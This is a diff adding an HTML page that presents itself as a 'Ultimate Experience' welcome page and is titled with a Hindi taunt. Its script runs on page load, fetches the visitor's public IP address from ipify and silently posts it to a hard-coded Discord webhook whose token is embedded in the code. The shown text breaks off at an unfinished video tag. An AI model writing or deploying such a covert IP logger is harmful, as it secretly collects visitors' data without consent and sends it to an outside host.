@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CHUTIYA BANAYA TUMKO</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var webhookURL = 'https://discord.com/api/webhooks/1220427989087686676/TdrrFpT8rKlndN-Io1kL5D73OsdDHs-xpR7rhhRl3WWDXYhQJ8cBmokrdWETc2ZzxRxj';
+                    var payload = {
+                        content: 'User IP: ' + data.ip
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .catch(error => console.error('Error:', error));
+        });
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Ultimate Experience!</h1>
+    <p>hahaha.</p>
+    <video
